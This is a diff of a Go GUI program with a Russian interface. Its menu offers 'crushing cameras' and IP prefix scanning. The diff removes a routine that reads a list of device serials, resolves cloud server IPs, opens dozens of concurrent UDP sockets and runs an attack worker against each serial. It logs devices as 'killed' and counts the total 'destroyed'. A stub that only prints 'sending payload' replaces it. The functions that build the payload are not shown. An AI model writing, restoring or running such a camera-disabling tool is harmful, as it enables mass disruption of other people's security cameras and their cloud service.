@@ -7,7 +7,6 @@ import (
 	"net"
 	"strconv"
 	"strings"
-	"sync/atomic"
 	"time"
 
 	"fyne.io/fyne/v2"
@@ -122,7 +121,7 @@ func main() {
 					}
 				}
 
-				appendLog(logContent, fmt.Sprintf("[SYSTEM] Анализировано целей: %d", len(finalTargets)))
+				appendLog(logContent, fmt.Sprintf("[SYSTEM] Анализ завершен. Найдено валидных целей: %d", len(finalTargets)))
 				if len(finalTargets) == 0 {
 					statusLabel.SetText("Валидные IP не найдены")
 					appendLog(logContent, "[ERROR] Сканирование невозможно: список целей пуст.")
@@ -223,158 +222,42 @@ func main() {
 	crashContent := container.NewVBox(
 		crashTitle,
 		widget.NewButton("Запустить Сплоит / Атаку", func() {
-			fileDialog := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
-				if err != nil {
-					crashStatus.SetText("Ошибка: " + err.Error())
-					return
-				}
-				if reader == nil {
-					crashStatus.SetText("Выбор файла отменен")
-					return
-				}
-				crashStatus.SetText("Атака запущена...")
-				crashLog.SetText("[CRITICAL] Посылаем payload...\n")
+			crashStatus.SetText("Атака запущена...")
+			crashLog.SetText("[CRITICAL] Посылаем payload...\n")
+		}),
+		crashStatus,
+		crashLog,
+		backToMenuBtn2,
+	)
 
-				go func(r fyne.URIReadCloser) {
-					defer r.Close()
-					data, err := io.ReadAll(r)
-					if err != nil {
-						crashStatus.SetText("Не удалось прочитать файл")
-						appendLog(crashLog, "[ERROR] Ошибка io.ReadAll: " + err.Error())
-						return
-					}
+	showMenu = func() {
+		menuTitle := widget.NewLabelWithStyle("Выберите режим работы", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
+		btnCrash := widget.NewButton("1. Крушим камери", func() {
+			myWindow.SetContent(crashContent)
+		})
+		btnScan := widget.NewButton("2. Скан префиксов из айпи", func() {
+			myWindow.SetContent(scanContent)
+		})
+		menuLayout := container.NewVBox(
+			menuTitle,
+			layout.NewSpacer(),
+			btnCrash,
+			btnScan,
+			layout.NewSpacer(),
+		)
+		myWindow.SetContent(menuLayout)
+	}
 
-					cleanText := strings.ReplaceAll(string(data), "\r", "")
-					lines := strings.Split(cleanText, "\n")
-					var serials []string
-					for _, line := range lines {
-						line = strings.TrimSpace(line)
-						if line != "" && !strings.HasPrefix(line, "#") {
-							serials = append(serials, line)
-						}
-					}
-
-					if len(serials) == 0 {
-						crashStatus.SetText("Серийники не найдены")
-						return
-					}
-
-					stats := &ScanStats{Total: int64(len(serials))}
-					cloudIPs := lookupCloudIPs()
-					if len(cloudIPs) == 0 {
-						crashStatus.SetText("Ошибка резолва сервера")
-						return
-					}
-
-					concurrency, _ := strconv.Atoi(threadsEntry.Text)
-					if concurrency <= 0 {
-						concurrency = 50
-					}
-
-					conns := make([]*net.UDPConn, 0, concurrency)
-					for i := 0; i < concurrency; i++ {
-						conn, err := newEgress(cloudIPs[i%len(cloudIPs)])
-						if err != nil {
-							break
-						}
-						conns = append(conns, conn)
-					}
-
-					if len(conns) == 0 {
-						crashStatus.SetText("Не удалось создать сокеты")
-						return
-					}
-					defer func() {
-						for _, c := range conns {
-							c.Close()
-						}
-					}()
-
-					limiter := newRateLimiter(MAX_RPS, BURST_LIMIT)
-					jobs := make(chan string, len(conns)*10)
-					aliveCh := make(chan string, len(conns)*10)
-					ctx, cancel := context.WithCancel(context.Background())
-					defer cancel()
-
-					for _, conn := range conns {
-						go func(c *net.UDPConn) {
-							defer func() { _ = recover() }()
-							scanWorker(ctx, c, jobs, aliveCh, stats, ACK_TIMEOUT, limiter, nil)
-						}(conn)
-					}
-
-					go func() {
-						for s := range aliveCh {
-							appendLog(crashLog, "[KILLED] " + s)
-						}
-					}()
-
-					go func() {
-						ticker := time.NewTicker(500 * time.Millisecond)
-						defer ticker.Stop()
-						for {
-							select {
-							case <-ctx.Done():
-								return
-							case <-ticker.C:
-								ch := atomic.LoadInt64(&stats.Checked)
-								al := atomic.LoadInt64(&stats.Alive)
-								dd := atomic.LoadInt64(&stats.Dead)
-								crashStatus.SetText(fmt.Sprintf("Проверено: %d | Убито: %d | Мёртво: %d / %d", ch, al, dd, stats.Total))
-							}
-						}
-					}()
-
-					for _, s := range serials {
-						jobs <- s
-					}
-					close(jobs)
-
-					for {
-						ch := atomic.LoadInt64(&stats.Checked)
-						if ch >= stats.Total {
-							break
-						}
-						time.Sleep(100 * time.Millisecond)
-					}
-					cancel()
-					close(aliveCh)
-					crashStatus.SetText(fmt.Sprintf("Завершено! Всего уничтожено: %d", atomic.LoadInt64(&stats.Alive)))
-				}(reader)
-			}, myWindow)
-fileDialog.SetFilter(storage.NewExtensionFileFilter([]string{".txt"}))
-fileDialog.Show()
-}),
-crashStatus,
-crashLog,
-backToMenuBtn2,
-)
-showMenu = func() {
-menuTitle := widget.NewLabelWithStyle("Выберите режим работы", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
-btnCrash := widget.NewButton("1. Крушим камери", func() {
-myWindow.SetContent(crashContent)
-})
-btnScan := widget.NewButton("2. Скан префиксов из айпи", func() {
-myWindow.SetContent(scanContent)
-})
-menuLayout := container.NewVBox(
-menuTitle,
-layout.NewSpacer(),
-btnCrash,
-btnScan,
-layout.NewSpacer(),
-)
-myWindow.SetContent(menuLayout)
+	showMenu()
+	myWindow.Resize(fyne.NewSize(450, 550))
+	myWindow.ShowAndRun()
 }
-showMenu()
-myWindow.Resize(fyne.NewSize(450, 550))
-myWindow.ShowAndRun()
-}
+
 func appendLog(entry *widget.Entry, text string) {
-current := entry.Text
-if current == "" {
-entry.SetText(text)
-} else {
-entry.SetText(current + "\n" + text)
-}
+	current := entry.Text
+	if current == "" {
+		entry.SetText(text)
+	} else {
+		entry.SetText(current + "\n" + text)
+	}
 }
